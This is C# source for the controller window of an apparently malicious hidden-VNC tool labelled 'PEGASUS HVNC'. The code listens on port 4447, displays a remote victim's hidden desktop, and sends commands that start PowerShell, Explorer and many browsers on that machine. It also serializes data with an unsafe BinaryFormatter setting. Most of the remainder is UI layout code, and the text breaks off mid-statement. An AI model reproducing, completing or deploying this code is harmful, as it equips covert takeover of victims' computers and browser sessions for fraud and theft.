using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Engine.Metafora_Dedomenon;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic.CompilerServices;
using PEGASUS_LIME.Properties;

namespace PEGASUS
{
	public class VNCForm : Form
	{
		private TcpClient tcpClient_0;

		private const int StartExplorer = 1025;

		private const int StartRun = 1026;

		private const int StartChrome = 1027;

		private const int StartEdge = 1028;

		private const int StartBrave = 1029;

		private const int StartFirefox = 1030;

		private const int StartIexplore = 1031;

		private const int StartPowershell = 1032;

		private const int StartPalemoon = 1033;

		private const int StartWaterfox = 1034;

		private const int StartOpera = 1035;

		private const int Start360 = 1036;

		private const int StartComodo = 1037;

		private const int StartNeon = 1039;

		public Server server;

		private long Counter = 0L;

		private IContainer components = null;

		private Panel panel1;

		private PictureBox pictureBox1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2GradientButton btnPowershell;

		private Guna2GradientButton btn360;

		private Guna2GradientButton btnPalemoon;

		private Guna2GradientButton guna2GradientButton4;

		private Guna2GradientButton guna2GradientButton5;

		private Guna2GradientButton btnBrave;

		private Guna2GradientButton btnEdge;

		private Guna2GradientButton btnFirefox;

		private Guna2GradientButton btnStartL;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2ResizeForm guna2ResizeForm1;

		private Label label1;

		private Guna2Separator bunifuSeparator1;

		private Guna2Separator bunifuSeparator3;

		private Guna2GradientButton btnWaterfox;

		private Guna2GradientButton btnOpera;

		private Guna2GradientButton btnComodo;

		private Guna2GradientButton btnOperaNeon;

		private Guna2GradientButton btnIE;

		private Guna2ControlBox guna2ControlBox3;

		private Guna2ControlBox guna2ControlBox2;

		private Guna2ControlBox guna2ControlBox1;

		private Guna2NumericUpDown ListenPort;

		private Label label12;

		public Guna2ToggleSwitch StartPort;

		private Label label13;

		private Label label2;

		private PictureBox pictureBox2;

		public VNCForm()
		{
			InitializeComponent();
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void VNCForm_Load(object sender, EventArgs e)
		{
			ListenPort.ForeColor = Color.White;
			new Thread((ThreadStart)delegate
			{
				try
				{
					Task task = Task.Factory.StartNew(delegate
					{
						fun1();
					});
					Task task2 = Task.Factory.StartNew(delegate
					{
						fun2();
					});
					Task.WaitAll(task, task2);
				}
				catch
				{
				}
			}).Start();
		}

		private void NewClient(object sender, EventArgs arg)
		{
			int num = 1;
		}

		private void StartNewServer(object sender, EventArgs arg)
		{
			server = new Server();
			server.SetParentWindow(pictureBox1);
			server.StartServer(4447);
			Server obj = server;
			obj.OnDisconnected = (Server.DisconnectedClientEvent)Delegate.Combine(obj.OnDisconnected, new Server.DisconnectedClientEvent(OnDisconnected));
			Server obj2 = server;
			obj2.OnConnected = (Server.ConnectedClientEvent)Delegate.Combine(obj2.OnConnected, new Server.ConnectedClientEvent(OnConnected));
			pictureBox1.Focus();
		}

		private void OnDisconnected(object sender, int uhid)
		{
		}

		private void OnConnected(object sender, int uhid)
		{
			Invoke(new EventHandler(NewClient), this, null);
		}

		private void VNCForm_FormClosed(object sender, FormClosedEventArgs e)
		{
		}

		private void btnExplorer_Click(object sender, EventArgs e)
		{
			server.Send(1025u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnRun_Click(object sender, EventArgs e)
		{
			server.Send(1026u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnStartChrome_Click(object sender, EventArgs e)
		{
			server.Send(1027u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnEdge_Click(object sender, EventArgs e)
		{
			server.Send(1029u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnBrave_Click(object sender, EventArgs e)
		{
			server.Send(1028u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnFirefox_Click(object sender, EventArgs e)
		{
			server.Send(1030u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnIexplore_Click(object sender, EventArgs e)
		{
			server.Send(1031u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnPowershell_Click(object sender, EventArgs e)
		{
			server.Send(1032u, 0L, 0L);
			pictureBox1.Focus();
		}

		private unsafe void pictureBox1_Paint(object sender, PaintEventArgs e)
		{
			byte[] desktopImageBytes = server.GetDesktopImageBytes();
			if (desktopImageBytes != null)
			{
				try
				{
					fixed (byte* value = desktopImageBytes)
					{
						int imageWidth = server.ImageWidth;
						int imageHeight = server.ImageHeight;
						using Bitmap bitmap = new Bitmap(imageWidth, imageHeight, imageWidth * 3, PixelFormat.Format24bppRgb, new IntPtr(value));
						bitmap.RotateFlip(RotateFlipType.Rotate180FlipX);
						e.Graphics.DrawImage(bitmap, 0, 0);
						return;
					}
				}
				catch (Exception)
				{
					e.Graphics.FillRectangle(Brushes.Black, new Rectangle(0, 0, pictureBox1.Width, pictureBox1.Height));
					pictureBox1.Invalidate();
					return;
				}
			}
			using Brush brush = new SolidBrush(pictureBox1.BackColor);
			e.Graphics.FillRectangle(brush, new Rectangle(0, 0, pictureBox1.Width, pictureBox1.Height));
		}

		private void VNCForm_MouseDown(object sender, MouseEventArgs e)
		{
			pictureBox1.Focus();
		}

		private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			pictureBox1.Focus();
		}

		private void btnWaterfox_Click(object sender, EventArgs e)
		{
			server.Send(1034u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnPalemoon_Click(object sender, EventArgs e)
		{
			server.Send(1033u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btn360_Click(object sender, EventArgs e)
		{
			server.Send(1036u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnComodo_Click(object sender, EventArgs e)
		{
			server.Send(1037u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnOpera_Click(object sender, EventArgs e)
		{
			server.Send(1035u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			Server obj = server;
			obj.OnDisconnected = (Server.DisconnectedClientEvent)Delegate.Remove(obj.OnDisconnected, new Server.DisconnectedClientEvent(OnDisconnected));
			server.StopServer();
			Thread.Sleep(1000);
		}

		private void btnOperaNeon_Click(object sender, EventArgs e)
		{
			server.Send(1039u, 0L, 0L);
			pictureBox1.Focus();
		}

		private void btnListen_Click(object sender, EventArgs e)
		{
			new Thread((ThreadStart)delegate
			{
				Task task = Task.Factory.StartNew(delegate
				{
					fun1();
				});
				Task task2 = Task.Factory.StartNew(delegate
				{
					fun2();
				});
				Task.WaitAll(task, task2);
			}).Start();
		}

		private void btnStop_Click(object sender, EventArgs e)
		{
			Server obj = server;
			obj.OnDisconnected = (Server.DisconnectedClientEvent)Delegate.Remove(obj.OnDisconnected, new Server.DisconnectedClientEvent(OnDisconnected));
			server.StopServer();
		}

		public void fun1()
		{
			server = new Server();
			server.SetParentWindow(pictureBox1);
			server.StartServer(4447);
			Server obj = server;
			obj.OnDisconnected = (Server.DisconnectedClientEvent)Delegate.Combine(obj.OnDisconnected, new Server.DisconnectedClientEvent(OnDisconnected));
			pictureBox1.Focus();
		}

		public void fun2()
		{
			Thread.Sleep(4000);
			server.Send(1025u, 0L, 0L);
			pictureBox1.Focus();
		}

		public void fun3()
		{
			server.StopServer();
			Thread.Sleep(1000);
		}

		private void StartPort_CheckedChanged(object sender, EventArgs e)
		{
			new Thread((ThreadStart)delegate
			{
				try
				{
					Task task = Task.Factory.StartNew(delegate
					{
						fun1();
					});
					Task task2 = Task.Factory.StartNew(delegate
					{
						fun2();
					});
					Task.WaitAll(task, task2);
				}
				catch
				{
				}
			}).Start();
		}

		internal void StartCort()
		{
			SendTCP("8888* ", (TcpClient)base.Tag);
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void panel1_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void guna2ControlBox1_Click(object sender, EventArgs e)
		{
			Hide();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(PEGASUS.VNCForm));
			panel1 = new System.Windows.Forms.Panel();
			guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
			label2 = new System.Windows.Forms.Label();
			guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
			btnStartL = new Guna.UI2.WinForms.Guna2GradientButton();
			btnFirefox = new Guna.UI2.WinForms.Guna2GradientButton();
			btn360 = new Guna.UI2.WinForms.Guna2GradientButton();
			btnEdge = new Guna.UI2.WinForms.Guna2GradientButton();
			btnBrave = new Guna.UI2.WinForms.Guna2GradientButton();
			label1 = new System.Windows.Forms.Label();
			btnComodo = new Guna.UI2.WinForms.Guna2GradientButton();
			btnWaterfox = new Guna.UI2.WinForms.Guna2GradientButton();
			btnPalemoon = new Guna.UI2.WinForms.Guna2GradientButton();
			btnIE = new Guna.UI2.WinForms.Guna2GradientButton();
			btnOpera = new Guna.UI2.WinForms.Guna2GradientButton();
			btnOperaNeon = new Guna.UI2.WinForms.Guna2GradientButton();
			btnPowershell = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton5 = new Guna.UI2.WinForms.Guna2GradientButton();
			guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
			bunifuSeparator1 = new Guna2Separator();
			bunifuSeparator3 = new Guna2Separator();
			pictureBox2 = new System.Windows.Forms.PictureBox();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2ResizeForm1 = new Guna.UI2.WinForms.Guna2ResizeForm(components);
			ListenPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
			label12 = new System.Windows.Forms.Label();
			StartPort = new Guna.UI2.WinForms.Guna2ToggleSwitch();
			label13 = new System.Windows.Forms.Label();
			panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox2).BeginInit();
			((System.ComponentModel.ISupportInitialize)ListenPort).BeginInit();
			SuspendLayout();
			panel1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			panel1.AutoSize = true;
			panel1.Controls.Add(guna2ControlBox1);
			panel1.Controls.Add(label2);
			panel1.Controls.Add(guna2ControlBox3);
			panel1.Controls.Add(pictureBox1);
			panel1.Controls.Add(guna2ControlBox2);
			panel1.Controls.Add(btnStartL);
			panel1.Controls.Add(btnFirefox);
			panel1.Controls.Add(btn360);
			panel1.Controls.Add(btnEdge);
			panel1.Controls.Add(btnBrave);
			panel1.Controls.Add(label1);
			panel1.Controls.Add(btnComodo);
			panel1.Controls.Add(btnWaterfox);
			panel1.Controls.Add(btnPalemoon);
			panel1.Controls.Add(btnIE);
			panel1.Controls.Add(btnOpera);
			panel1.Controls.Add(btnOperaNeon);
			panel1.Controls.Add(btnPowershell);
			panel1.Controls.Add(guna2GradientButton5);
			panel1.Controls.Add(guna2GradientButton4);
			panel1.Controls.Add(bunifuSeparator1);
			panel1.Controls.Add(bunifuSeparator3);
			panel1.Controls.Add(pictureBox2);
			panel1.Location = new System.Drawing.Point(7, 11);
			panel1.Margin = new System.Windows.Forms.Padding(2);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(1171, 688);
			panel1.TabIndex = 0;
			panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(panel1_MouseDown);
			guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox1.BackgroundImage");
			guna2ControlBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox1.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
			guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.HoverState.BorderColor = System.Drawing.Color.Black;
			guna2ControlBox1.HoverState.FillColor = System.Drawing.Color.Black;
			guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
			guna2ControlBox1.IconColor = System.Drawing.Color.White;
			guna2ControlBox1.Location = new System.Drawing.Point(1124, 3);
			guna2ControlBox1.Name = "guna2ControlBox1";
			guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
			guna2ControlBox1.ShowIcon = false;
			guna2ControlBox1.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox1.TabIndex = 275;
			guna2ControlBox1.UseTransparentBackground = true;
			guna2ControlBox1.Click += new System.EventHandler(guna2ControlBox1_Click);
			label2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label2.AutoSize = true;
			label2.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			label2.ForeColor = System.Drawing.Color.White;
			label2.Location = new System.Drawing.Point(1049, 554);
			label2.Name = "label2";
			label2.Size = new System.Drawing.Size(107, 16);
			label2.TabIndex = 274;
			label2.Text = "PEGASUS HVNC";
			guna2ControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox3.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox3.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox3.BackgroundImage");
			guna2ControlBox3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox3.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
			guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			guna2ControlBox3.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox3.HoverState.BorderColor = System.Drawing.Color.Black;
			guna2ControlBox3.HoverState.FillColor = System.Drawing.Color.Black;
			guna2ControlBox3.HoverState.Parent = guna2ControlBox3;
			guna2ControlBox3.IconColor = System.Drawing.Color.White;
			guna2ControlBox3.Location = new System.Drawing.Point(1034, 3);
			guna2ControlBox3.Name = "guna2ControlBox3";
			guna2ControlBox3.ShadowDecoration.Parent = guna2ControlBox3;
			guna2ControlBox3.ShowIcon = false;
			guna2ControlBox3.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox3.TabIndex = 277;
			guna2ControlBox3.UseTransparentBackground = true;
			pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
			pictureBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("pictureBox1.BackgroundImage");
			pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			pictureBox1.Location = new System.Drawing.Point(0, 0);
			pictureBox1.Margin = new System.Windows.Forms.Padding(2);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(1030, 688);
			pictureBox1.TabIndex = 0;
			pictureBox1.TabStop = false;
			pictureBox1.Paint += new System.Windows.Forms.PaintEventHandler(pictureBox1_Paint);
			pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(pictureBox1_MouseDown);
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox2.BackgroundImage");
			guna2ControlBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox2.ControlBoxStyle = Guna.UI2.WinForms.Enums.ControlBoxStyle.Custom;
			guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
			guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.HoverState.BorderColor = System.Drawing.Color.Black;
			guna2ControlBox2.HoverState.FillColor = System.Drawing.Color.Black;
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(1079, 3);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.ShowIcon = false;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 29);
			guna2ControlBox2.TabIndex = 276;
			guna2ControlBox2.UseTransparentBackground = true;
			btnStartL.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnStartL.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnStartL.BorderThickness = 1;
			btnStartL.CheckedState.BorderColor = System.Drawing.Color.White;
			btnStartL.CheckedState.FillColor = System.Drawing.Color.Black;
			btnStartL.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnStartL.CheckedState.Parent = btnStartL;
			btnStartL.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnStartL.CustomImages.Parent = btnStartL;
			btnStartL.DisabledState.BorderColor = System.Drawing.Color.White;
			btnStartL.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnStartL.DisabledState.FillColor = System.Drawing.Color.Black;
			btnStartL.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnStartL.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnStartL.DisabledState.Parent = btnStartL;
			btnStartL.FillColor = System.Drawing.Color.Black;
			btnStartL.FillColor2 = System.Drawing.Color.Black;
			btnStartL.Font = new System.Drawing.Font("Electrolize", 9f);
			btnStartL.ForeColor = System.Drawing.Color.White;
			btnStartL.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnStartL.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnStartL.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnStartL.HoverState.FillColor = System.Drawing.Color.Black;
			btnStartL.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnStartL.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnStartL.HoverState.Parent = btnStartL;
			btnStartL.Location = new System.Drawing.Point(1040, 65);
			btnStartL.Name = "btnStartL";
			btnStartL.ShadowDecoration.Parent = btnStartL;
			btnStartL.Size = new System.Drawing.Size(123, 27);
			btnStartL.TabIndex = 152;
			btnStartL.Text = "Chrome";
			btnStartL.Click += new System.EventHandler(btnStartChrome_Click);
			btnFirefox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnFirefox.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnFirefox.BorderThickness = 1;
			btnFirefox.CheckedState.BorderColor = System.Drawing.Color.White;
			btnFirefox.CheckedState.FillColor = System.Drawing.Color.Black;
			btnFirefox.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnFirefox.CheckedState.Parent = btnFirefox;
			btnFirefox.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnFirefox.CustomImages.Parent = btnFirefox;
			btnFirefox.DisabledState.BorderColor = System.Drawing.Color.White;
			btnFirefox.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnFirefox.DisabledState.FillColor = System.Drawing.Color.Black;
			btnFirefox.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnFirefox.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnFirefox.DisabledState.Parent = btnFirefox;
			btnFirefox.FillColor = System.Drawing.Color.Black;
			btnFirefox.FillColor2 = System.Drawing.Color.Black;
			btnFirefox.Font = new System.Drawing.Font("Electrolize", 9f);
			btnFirefox.ForeColor = System.Drawing.Color.White;
			btnFirefox.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnFirefox.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnFirefox.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnFirefox.HoverState.FillColor = System.Drawing.Color.Black;
			btnFirefox.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnFirefox.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnFirefox.HoverState.Parent = btnFirefox;
			btnFirefox.Location = new System.Drawing.Point(1040, 98);
			btnFirefox.Name = "btnFirefox";
			btnFirefox.ShadowDecoration.Parent = btnFirefox;
			btnFirefox.Size = new System.Drawing.Size(123, 27);
			btnFirefox.TabIndex = 153;
			btnFirefox.Text = "Firefox";
			btnFirefox.Click += new System.EventHandler(btnFirefox_Click);
			btn360.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btn360.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btn360.BorderThickness = 1;
			btn360.CheckedState.BorderColor = System.Drawing.Color.White;
			btn360.CheckedState.FillColor = System.Drawing.Color.Black;
			btn360.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btn360.CheckedState.Parent = btn360;
			btn360.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btn360.CustomImages.Parent = btn360;
			btn360.DisabledState.BorderColor = System.Drawing.Color.White;
			btn360.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
			btn360.DisabledState.FillColor = System.Drawing.Color.Black;
			btn360.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btn360.DisabledState.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			btn360.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btn360.DisabledState.Parent = btn360;
			btn360.FillColor = System.Drawing.Color.Black;
			btn360.FillColor2 = System.Drawing.Color.Black;
			btn360.Font = new System.Drawing.Font("Electrolize", 9f);
			btn360.ForeColor = System.Drawing.Color.White;
			btn360.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btn360.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btn360.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btn360.HoverState.FillColor = System.Drawing.Color.Black;
			btn360.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btn360.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btn360.HoverState.Parent = btn360;
			btn360.Location = new System.Drawing.Point(1040, 131);
			btn360.Name = "btn360";
			btn360.ShadowDecoration.Parent = btn360;
			btn360.Size = new System.Drawing.Size(123, 27);
			btn360.TabIndex = 159;
			btn360.Text = "360";
			btn360.Click += new System.EventHandler(btn360_Click);
			btnEdge.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnEdge.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnEdge.BorderThickness = 1;
			btnEdge.CheckedState.BorderColor = System.Drawing.Color.White;
			btnEdge.CheckedState.FillColor = System.Drawing.Color.Black;
			btnEdge.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnEdge.CheckedState.Parent = btnEdge;
			btnEdge.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnEdge.CustomImages.Parent = btnEdge;
			btnEdge.DisabledState.BorderColor = System.Drawing.Color.White;
			btnEdge.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnEdge.DisabledState.FillColor = System.Drawing.Color.Black;
			btnEdge.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnEdge.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnEdge.DisabledState.Parent = btnEdge;
			btnEdge.FillColor = System.Drawing.Color.Black;
			btnEdge.FillColor2 = System.Drawing.Color.Black;
			btnEdge.Font = new System.Drawing.Font("Electrolize", 9f);
			btnEdge.ForeColor = System.Drawing.Color.White;
			btnEdge.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnEdge.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnEdge.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnEdge.HoverState.FillColor = System.Drawing.Color.Black;
			btnEdge.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnEdge.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnEdge.HoverState.Parent = btnEdge;
			btnEdge.Location = new System.Drawing.Point(1040, 164);
			btnEdge.Name = "btnEdge";
			btnEdge.ShadowDecoration.Parent = btnEdge;
			btnEdge.Size = new System.Drawing.Size(123, 27);
			btnEdge.TabIndex = 154;
			btnEdge.Text = "Edge";
			btnEdge.Click += new System.EventHandler(btnEdge_Click);
			btnBrave.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnBrave.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnBrave.BorderThickness = 1;
			btnBrave.CheckedState.BorderColor = System.Drawing.Color.White;
			btnBrave.CheckedState.FillColor = System.Drawing.Color.Black;
			btnBrave.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnBrave.CheckedState.Parent = btnBrave;
			btnBrave.CustomBorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnBrave.CustomImages.Parent = btnBrave;
			btnBrave.DisabledState.BorderColor = System.Drawing.Color.White;
			btnBrave.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			btnBrave.DisabledState.FillColor = System.Drawing.Color.Black;
			btnBrave.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
			btnBrave.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnBrave.DisabledState.Parent = btnBrave;
			btnBrave.FillColor = System.Drawing.Color.Black;
			btnBrave.FillColor2 = System.Drawing.Color.Black;
			btnBrave.Font = new System.Drawing.Font("Electrolize", 9f);
			btnBrave.ForeColor = System.Drawing.Color.White;
			btnBrave.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
			btnBrave.HoverState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnBrave.HoverState.CustomBorderColor = System.Drawing.Color.Black;
			btnBrave.HoverState.FillColor = System.Drawing.Color.Black;
			btnBrave.HoverState.FillColor2 = System.Drawing.Color.FromArgb(30, 30, 30);
			btnBrave.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnBrave.HoverState.Parent = btnBrave;
			btnBrave.Location = new System.Drawing.Point(1040, 197);
			btnBrave.Name = "btnBrave";
			btnBrave.ShadowDecoration.Parent = btnBrave;
			btnBrave.Size = new System.Drawing.Size(123, 27);
			btnBrave.TabIndex = 155;
			btnBrave.Text = "Brave";
			btnBrave.Click += new System.EventHandler(btnBrave_Click);
			label1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label1.AutoSize = true;
			label1.Font = new System.Drawing.Font("Electrolize", 9.749999f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label1.ForeColor = System.Drawing.Color.LightGray;
			label1.Location = new System.Drawing.Point(1061, 456);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(78, 16);
			label1.TabIndex = 165;
			label1.Text = "C++ HVNC";
			btnComodo.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnComodo.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			btnComodo.BorderThickness = 1;
